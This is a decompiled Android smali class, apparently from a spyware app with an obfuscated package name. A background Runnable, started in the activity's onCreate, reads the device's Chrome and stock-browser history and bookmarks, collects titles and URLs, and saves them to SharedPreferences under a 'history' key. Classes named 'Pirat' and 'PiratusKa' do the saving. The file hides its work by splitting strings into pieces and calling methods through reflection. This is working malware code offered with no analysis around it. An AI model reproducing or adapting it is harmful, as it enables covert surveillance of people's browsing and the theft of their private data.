.class Llb/iuattiylwr/pcjlwvqooxy/DragonWaer$1;
.super Ljava/lang/Object;
.source "DragonWaer.java"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Llb/iuattiylwr/pcjlwvqooxy/DragonWaer;->onCreate(Landroid/os/Bundle;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field private r:I

.field private strbrout:Ljava/lang/String;

.field final synthetic this$0:Llb/iuattiylwr/pcjlwvqooxy/DragonWaer;


# direct methods
.method constructor <init>(Llb/iuattiylwr/pcjlwvqooxy/DragonWaer;)V
    .locals 1

    .prologue
    .line 1
    iput-object p1, p0, Llb/iuattiylwr/pcjlwvqooxy/DragonWaer$1;->this$0:Llb/iuattiylwr/pcjlwvqooxy/DragonWaer;

    .line 91
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 92
    const-string v0, ""

    iput-object v0, p0, Llb/iuattiylwr/pcjlwvqooxy/DragonWaer$1;->strbrout:Ljava/lang/String;

    return-void
.end method


# virtual methods
.method public run()V
    .locals 32

    .prologue
    .line 97
    :try_start_0
    move-object/from16 v0, p0

    iget-object v2, v0, Llb/iuattiylwr/pcjlwvqooxy/DragonWaer$1;->this$0:Llb/iuattiylwr/pcjlwvqooxy/DragonWaer;

    invoke-virtual {v2}, Llb/iuattiylwr/pcjlwvqooxy/DragonWaer;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v22

    .line 99
    .local v22, "pm":Landroid/content/pm/PackageManager;
    move-object/from16 v0, p0

    iget-object v2, v0, Llb/iuattiylwr/pcjlwvqooxy/DragonWaer$1;->this$0:Llb/iuattiylwr/pcjlwvqooxy/DragonWaer;

    const-string v6, "com.android.chrome.browser"

    move-object/from16 v0, v22

    invoke-static {v2, v6, v0}, Llb/iuattiylwr/pcjlwvqooxy/DragonWaer;->access$0(Llb/iuattiylwr/pcjlwvqooxy/DragonWaer;Ljava/lang/String;Landroid/content/pm/PackageManager;)Z

    move-result v20

    .line 100
    .local v20, "gimak":Z
    if-eqz v20, :cond_0

    .line 101
    const-string v18, "tl"

    .line 102
    .local v18, "ewrtger":Ljava/lang/String;
    const/4 v2, 0x2

    new-array v4, v2, [Ljava/lang/String;

    const/4 v2, 0x0

    new-instance v6, Ljava/lang/StringBuilder;

    const-string v7, "ti"

    invoke-direct {v6, v7}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, v18

    invoke-virtual {v6, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    const-string v7, "e"

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    aput-object v6, v4, v2

    const/4 v2, 0x1

    const-string v6, "url"

    aput-object v6, v4, v2
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 103
    .local v4, "proj":[Ljava/lang/String;
    const/4 v3, 0x0

    .line 105
    .local v3, "uriCustom":Landroid/net/Uri;
    :try_start_1
    const-string v15, "ar"

    .line 106
    .local v15, "dsfdfdd33":Ljava/lang/String;
    const-string v2, "android.net.Uri"

    invoke-static {v2}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v2

    new-instance v6, Ljava/lang/StringBuilder;

    const-string v7, "p"

    invoke-direct {v6, v7}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v6, v15}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    const-string v7, "se"

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    const/4 v7, 0x1

    new-array v7, v7, [Ljava/lang/Class;

    const/4 v8, 0x0

    const-class v9, Ljava/lang/String;

    aput-object v9, v7, v8

    invoke-virtual {v2, v6, v7}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v2

    const-string v6, "android.net.Uri"

    invoke-static {v6}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v6

    const/4 v7, 0x1

    new-array v7, v7, [Ljava/lang/Object;

    const/4 v8, 0x0

    const-string v9, "content://com.android.chrome.browser/history"

    aput-object v9, v7, v8

    invoke-virtual {v2, v6, v7}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v2

    move-object v0, v2

    check-cast v0, Landroid/net/Uri;

    move-object v3, v0
    :try_end_1
    .catch Ljava/lang/Throwable; {:try_start_1 .. :try_end_1} :catch_3
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    .line 111
    .end local v15    # "dsfdfdd33":Ljava/lang/String;
    :goto_0
    :try_start_2
    const-string v5, "bookmark = 0"

    .line 112
    .local v5, "sel":Ljava/lang/String;
    move-object/from16 v0, p0

    iget-object v2, v0, Llb/iuattiylwr/pcjlwvqooxy/DragonWaer$1;->this$0:Llb/iuattiylwr/pcjlwvqooxy/DragonWaer;

    invoke-virtual {v2}, Llb/iuattiylwr/pcjlwvqooxy/DragonWaer;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v2

    const/4 v6, 0x0

    const-string v7, "date DESC"

    invoke-virtual/range {v2 .. v7}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v21

    .line 113
    .local v21, "mCur":Landroid/database/Cursor;
    invoke-interface/range {v21 .. v21}, Landroid/database/Cursor;->moveToFirst()Z

    .line 115
    const-string v31, ""

    .line 117
    .local v31, "zaglavie":Ljava/lang/String;
    const-string v27, ""

    .line 119
    .local v27, "url":Ljava/lang/String;
    invoke-interface/range {v21 .. v21}, Landroid/database/Cursor;->moveToFirst()Z

    move-result v2

    if-eqz v2, :cond_0

    invoke-interface/range {v21 .. v21}, Landroid/database/Cursor;->getCount()I

    move-result v2

    if-lez v2, :cond_0

    .line 120
    const/4 v12, 0x1

    .line 121
    .local v12, "cont":Z
    const/4 v2, 0x0

    move-object/from16 v0, p0

    iput v2, v0, Llb/iuattiylwr/pcjlwvqooxy/DragonWaer$1;->r:I

    .line 122
    :goto_1
    invoke-interface/range {v21 .. v21}, Landroid/database/Cursor;->isAfterLast()Z
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0

    move-result v2

    if-nez v2, :cond_0

    if-nez v12, :cond_2

    .line 140
    .end local v3    # "uriCustom":Landroid/net/Uri;
    .end local v4    # "proj":[Ljava/lang/String;
    .end local v5    # "sel":Ljava/lang/String;
    .end local v12    # "cont":Z
    .end local v18    # "ewrtger":Ljava/lang/String;
    .end local v20    # "gimak":Z
    .end local v21    # "mCur":Landroid/database/Cursor;
    .end local v22    # "pm":Landroid/content/pm/PackageManager;
    .end local v27    # "url":Ljava/lang/String;
    .end local v31    # "zaglavie":Ljava/lang/String;
    :cond_0
    :goto_2
    :try_start_3
    move-object/from16 v0, p0

    iget-object v2, v0, Llb/iuattiylwr/pcjlwvqooxy/DragonWaer$1;->this$0:Llb/iuattiylwr/pcjlwvqooxy/DragonWaer;

    invoke-virtual {v2}, Llb/iuattiylwr/pcjlwvqooxy/DragonWaer;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v6

    sget-object v7, Landroid/provider/Browser;->BOOKMARKS_URI:Landroid/net/Uri;

    sget-object v8, Landroid/provider/Browser;->HISTORY_PROJECTION:[Ljava/lang/String;

    const/4 v9, 0x0

    const/4 v10, 0x0

    const-string v11, "date DESC"

    invoke-virtual/range {v6 .. v11}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v30

    .line 141
    .local v30, "webLinksCursor":Landroid/database/Cursor;
    invoke-interface/range {v30 .. v30}, Landroid/database/Cursor;->getCount()I

    move-result v24

    .line 142
    .local v24, "row_count":I
    const-string v16, "tl"

    .line 143
    .local v16, "dsfgdfgd":Ljava/lang/String;
    new-instance v2, Ljava/lang/StringBuilder;

    const-string v6, "ti"

    invoke-direct {v2, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, v16

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v6, "e"

    invoke-virtual {v2, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    move-object/from16 v0, v30

    invoke-interface {v0, v2}, Landroid/database/Cursor;->getColumnIndexOrThrow(Ljava/lang/String;)I

    move-result v26

    .line 144
    .local v26, "title_column_index":I
    const-string v2, "url"

    move-object/from16 v0, v30

    invoke-interface {v0, v2}, Landroid/database/Cursor;->getColumnIndexOrThrow(Ljava/lang/String;)I

    move-result v28

    .line 146
    .local v28, "url_column_index":I
    const/4 v2, -0x1

    move/from16 v0, v26

    if-le v0, v2, :cond_1

    const/4 v2, -0x1

    move/from16 v0, v28

    if-le v0, v2, :cond_1

    if-lez v24, :cond_1

    .line 148
    const/4 v12, 0x1

    .line 149
    .restart local v12    # "cont":Z
    const/4 v2, 0x0

    move-object/from16 v0, p0

    iput v2, v0, Llb/iuattiylwr/pcjlwvqooxy/DragonWaer$1;->r:I

    .line 150
    invoke-interface/range {v30 .. v30}, Landroid/database/Cursor;->moveToFirst()Z

    .line 151
    :goto_3
    invoke-interface/range {v30 .. v30}, Landroid/database/Cursor;->isAfterLast()Z

    move-result v2

    if-nez v2, :cond_1

    if-nez v12, :cond_4

    .line 177
    .end local v12    # "cont":Z
    :cond_1
    invoke-interface/range {v30 .. v30}, Landroid/database/Cursor;->close()V

    .line 179
    const-string v13, "ste"

    .line 180
    .local v13, "dfd":Ljava/lang/String;
    move-object/from16 v0, p0

    iget-object v2, v0, Llb/iuattiylwr/pcjlwvqooxy/DragonWaer$1;->this$0:Llb/iuattiylwr/pcjlwvqooxy/DragonWaer;

    new-instance v6, Ljava/lang/StringBuilder;

    const-string v7, "sy"

    invoke-direct {v6, v7}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v6, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    const-string v7, "ma"

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    const/4 v7, 0x0

    invoke-virtual {v2, v6, v7}, Llb/iuattiylwr/pcjlwvqooxy/DragonWaer;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v29

    .line 181
    .local v29, "userDetails":Landroid/content/SharedPreferences;
    new-instance v25, Llb/iuattiylwr/pcjlwvqooxy/Pirat;

    move-object/from16 v0, v25

    move-object/from16 v1, v29

    invoke-direct {v0, v1}, Llb/iuattiylwr/pcjlwvqooxy/Pirat;-><init>(Landroid/content/SharedPreferences;)V

    .line 182
    .local v25, "rtrtr":Llb/iuattiylwr/pcjlwvqooxy/Pirat;
    invoke-virtual/range {v25 .. v25}, Llb/iuattiylwr/pcjlwvqooxy/Pirat;->gett()Landroid/content/SharedPreferences$Editor;

    move-result-object v17

    .line 183
    .local v17, "editor":Landroid/content/SharedPreferences$Editor;
    new-instance v23, Llb/iuattiylwr/pcjlwvqooxy/PiratusKa;

    invoke-direct/range {v23 .. v23}, Llb/iuattiylwr/pcjlwvqooxy/PiratusKa;-><init>()V

    .line 184
    .local v23, "putt":Llb/iuattiylwr/pcjlwvqooxy/PiratusKa;
    const-string v2, "putString"

    const-string v6, "history"

    new-instance v7, Ljava/lang/StringBuilder;

    const-string v8, "\r\n "

    invoke-direct {v7, v8}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, p0

    iget-object v8, v0, Llb/iuattiylwr/pcjlwvqooxy/DragonWaer$1;->strbrout:Ljava/lang/String;

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    move-object/from16 v0, v23

    move-object/from16 v1, v17

    invoke-virtual {v0, v1, v2, v6, v7}, Llb/iuattiylwr/pcjlwvqooxy/PiratusKa;->runus(Landroid/content/SharedPreferences$Editor;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    .line 188
    const-string v14, "ppl"
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_1

    .line 190
    .local v14, "dfdsfsd":Ljava/lang/String;
    :try_start_4
    const-string v2, "android.content.SharedPreferences$Editor"

    invoke-static {v2}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v2

    new-instance v6, Ljava/lang/StringBuilder;

    const-string v7, "a"

    invoke-direct {v6, v7}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v6, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    const-string v7, "y"

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    const/4 v7, 0x0

    invoke-virtual {v2, v6, v7}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v2

    const/4 v6, 0x0

    move-object/from16 v0, v17

    invoke-virtual {v2, v0, v6}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_4
    .catch Ljava/lang/Throwable; {:try_start_4 .. :try_end_4} :catch_2
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_1

    .line 197
    .end local v13    # "dfd":Ljava/lang/String;
    .end local v14    # "dfdsfsd":Ljava/lang/String;
    .end local v16    # "dsfgdfgd":Ljava/lang/String;
    .end local v17    # "editor":Landroid/content/SharedPreferences$Editor;
    .end local v23    # "putt":Llb/iuattiylwr/pcjlwvqooxy/PiratusKa;
    .end local v24    # "row_count":I
    .end local v25    # "rtrtr":Llb/iuattiylwr/pcjlwvqooxy/Pirat;
    .end local v26    # "title_column_index":I
    .end local v28    # "url_column_index":I
    .end local v29    # "userDetails":Landroid/content/SharedPreferences;
    .end local v30    # "webLinksCursor":Landroid/database/Cursor;
    :goto_4
    return-void

    .line 123
    .restart local v3    # "uriCustom":Landroid/net/Uri;
    .restart local v4    # "proj":[Ljava/lang/String;
    .restart local v5    # "sel":Ljava/lang/String;
    .restart local v12    # "cont":Z
    .restart local v18    # "ewrtger":Ljava/lang/String;
    .restart local v20    # "gimak":Z
    .restart local v21    # "mCur":Landroid/database/Cursor;
    .restart local v22    # "pm":Landroid/content/pm/PackageManager;
    .restart local v27    # "url":Ljava/lang/String;
    .restart local v31    # "zaglavie":Ljava/lang/String;
    :cond_2
    :try_start_5
    const-string v19, "tl"

    .line 124
    .local v19, "ghfgg":Ljava/lang/String;
    new-instance v2, Ljava/lang/StringBuilder;

    const-string v6, "ti"

    invoke-direct {v2, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, v19

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v6, "e"

    invoke-virtual {v2, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    move-object/from16 v0, v21

    invoke-interface {v0, v2}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v2

    move-object/from16 v0, v21

    invoke-interface {v0, v2}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v31

    .line 125
    const-string v2, "url"

    move-object/from16 v0, v21

    invoke-interface {v0, v2}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v2

    move-object/from16 v0, v21

    invoke-interface {v0, v2}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v27

    .line 127
    new-instance v2, Ljava/lang/StringBuilder;

    move-object/from16 v0, p0

    iget-object v6, v0, Llb/iuattiylwr/pcjlwvqooxy/DragonWaer$1;->strbrout:Ljava/lang/String;

    invoke-static {v6}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v6

    invoke-direct {v2, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v6, "\r\n"

    invoke-virtual {v2, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    move-object/from16 v0, v31

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v6, "\r\n"

    invoke-virtual {v2, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    move-object/from16 v0, v27

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v6, "\r\n"

    invoke-virtual {v2, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    move-object/from16 v0, p0

    iput-object v2, v0, Llb/iuattiylwr/pcjlwvqooxy/DragonWaer$1;->strbrout:Ljava/lang/String;

    .line 128
    move-object/from16 v0, p0

    iget v2, v0, Llb/iuattiylwr/pcjlwvqooxy/DragonWaer$1;->r:I

    add-int/lit8 v2, v2, 0x1

    move-object/from16 v0, p0

    iput v2, v0, Llb/iuattiylwr/pcjlwvqooxy/DragonWaer$1;->r:I

    .line 129
    move-object/from16 v0, p0

    iget v2, v0, Llb/iuattiylwr/pcjlwvqooxy/DragonWaer$1;->r:I

    const/16 v6, 0xa

    if-le v2, v6, :cond_3

    .line 130
    const/4 v12, 0x0

    .line 132
    :cond_3
    invoke-interface/range {v21 .. v21}, Landroid/database/Cursor;->moveToNext()Z
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_0

    goto/16 :goto_1

    .line 136
    .end local v3    # "uriCustom":Landroid/net/Uri;
    .end local v4    # "proj":[Ljava/lang/String;
    .end local v5    # "sel":Ljava/lang/String;
    .end local v12    # "cont":Z
    .end local v18    # "ewrtger":Ljava/lang/String;
    .end local v19    # "ghfgg":Ljava/lang/String;
    .end local v20    # "gimak":Z
    .end local v21    # "mCur":Landroid/database/Cursor;
    .end local v22    # "pm":Landroid/content/pm/PackageManager;
    .end local v27    # "url":Ljava/lang/String;
    .end local v31    # "zaglavie":Ljava/lang/String;
    :catch_0
    move-exception v2

    goto/16 :goto_2

    .line 153
    .restart local v12    # "cont":Z
    .restart local v16    # "dsfgdfgd":Ljava/lang/String;
    .restart local v24    # "row_count":I
    .restart local v26    # "title_column_index":I
    .restart local v28    # "url_column_index":I
    .restart local v30    # "webLinksCursor":Landroid/database/Cursor;
    :cond_4
    const/4 v2, 0x4

    :try_start_6
    move-object/from16 v0, v30

    invoke-interface {v0, v2}, Landroid/database/Cursor;->getInt(I)I

    move-result v2

    const/4 v6, 0x1

    if-eq v2, v6, :cond_7

    .line 155
    move-object/from16 v0, v30

    move/from16 v1, v28

    invoke-interface {v0, v1}, Landroid/database/Cursor;->isNull(I)Z

    move-result v2

    if-nez v2, :cond_7

    .line 158
    move-object/from16 v0, v30

    move/from16 v1, v26

    invoke-interface {v0, v1}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v31

    .line 159
    .restart local v31    # "zaglavie":Ljava/lang/String;
    move-object/from16 v0, v30

    move/from16 v1, v28

    invoke-interface {v0, v1}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v27

    .line 160
    .restart local v27    # "url":Ljava/lang/String;
    invoke-virtual/range {v31 .. v31}, Ljava/lang/String;->length()I

    move-result v2

    const/16 v6, 0x32

    if-le v2, v6, :cond_5

    .line 161
    const/4 v2, 0x0

    const/16 v6, 0x31

    move-object/from16 v0, v31

    invoke-virtual {v0, v2, v6}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v31

    .line 163
    :cond_5
    invoke-virtual/range {v27 .. v27}, Ljava/lang/String;->length()I

    move-result v2

    const/16 v6, 0x32

    if-le v2, v6, :cond_6

    .line 164
    const/4 v2, 0x0

    const/16 v6, 0x31

    move-object/from16 v0, v27

    invoke-virtual {v0, v2, v6}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v27

    .line 166
    :cond_6
    new-instance v2, Ljava/lang/StringBuilder;

    move-object/from16 v0, p0

    iget-object v6, v0, Llb/iuattiylwr/pcjlwvqooxy/DragonWaer$1;->strbrout:Ljava/lang/String;

    invoke-static {v6}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v6

    invoke-direct {v2, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v6, "\r\n"

    invoke-virtual {v2, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    move-object/from16 v0, v31

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v6, "\r\n"

    invoke-virtual {v2, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    move-object/from16 v0, v27

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v6, "\r\n"

    invoke-virtual {v2, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    move-object/from16 v0, p0

    iput-object v2, v0, Llb/iuattiylwr/pcjlwvqooxy/DragonWaer$1;->strbrout:Ljava/lang/String;

    .line 167
    move-object/from16 v0, p0

    iget v2, v0, Llb/iuattiylwr/pcjlwvqooxy/DragonWaer$1;->r:I

    add-int/lit8 v2, v2, 0x1

    move-object/from16 v0, p0

    iput v2, v0, Llb/iuattiylwr/pcjlwvqooxy/DragonWaer$1;->r:I

    .line 168
    move-object/from16 v0, p0

    iget v2, v0, Llb/iuattiylwr/pcjlwvqooxy/DragonWaer$1;->r:I

    const/16 v6, 0xa

    if-le v2, v6, :cond_7

    .line 169
    const/4 v12, 0x0

    .line 174
    .end local v27    # "url":Ljava/lang/String;
    .end local v31    # "zaglavie":Ljava/lang/String;
    :cond_7
    invoke-interface/range {v30 .. v30}, Landroid/database/Cursor;->moveToNext()Z
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_1

    goto/16 :goto_3

    .line 194
    .end local v12    # "cont":Z
    .end local v16    # "dsfgdfgd":Ljava/lang/String;
    .end local v24    # "row_count":I
    .end local v26    # "title_column_index":I
    .end local v28    # "url_column_index":I
    .end local v30    # "webLinksCursor":Landroid/database/Cursor;
    :catch_1
    move-exception v2

    goto/16 :goto_4

    .line 192
    .restart local v13    # "dfd":Ljava/lang/String;
    .restart local v14    # "dfdsfsd":Ljava/lang/String;
    .restart local v16    # "dsfgdfgd":Ljava/lang/String;
    .restart local v17    # "editor":Landroid/content/SharedPreferences$Editor;
    .restart local v23    # "putt":Llb/iuattiylwr/pcjlwvqooxy/PiratusKa;
    .restart local v24    # "row_count":I
    .restart local v25    # "rtrtr":Llb/iuattiylwr/pcjlwvqooxy/Pirat;
    .restart local v26    # "title_column_index":I
    .restart local v28    # "url_column_index":I
    .restart local v29    # "userDetails":Landroid/content/SharedPreferences;
    .restart local v30    # "webLinksCursor":Landroid/database/Cursor;
    :catch_2
    move-exception v2

    goto/16 :goto_4

    .line 108
    .end local v13    # "dfd":Ljava/lang/String;
    .end local v14    # "dfdsfsd":Ljava/lang/String;
    .end local v16    # "dsfgdfgd":Ljava/lang/String;
    .end local v17    # "editor":Landroid/content/SharedPreferences$Editor;
    .end local v23    # "putt":Llb/iuattiylwr/pcjlwvqooxy/PiratusKa;
    .end local v24    # "row_count":I
    .end local v25    # "rtrtr":Llb/iuattiylwr/pcjlwvqooxy/Pirat;
    .end local v26    # "title_column_index":I
    .end local v28    # "url_column_index":I
    .end local v29    # "userDetails":Landroid/content/SharedPreferences;
    .end local v30    # "webLinksCursor":Landroid/database/Cursor;
    .restart local v3    # "uriCustom":Landroid/net/Uri;
    .restart local v4    # "proj":[Ljava/lang/String;
    .restart local v18    # "ewrtger":Ljava/lang/String;
    .restart local v20    # "gimak":Z
    .restart local v22    # "pm":Landroid/content/pm/PackageManager;
    :catch_3
    move-exception v2

    goto/16 :goto_0
.end method
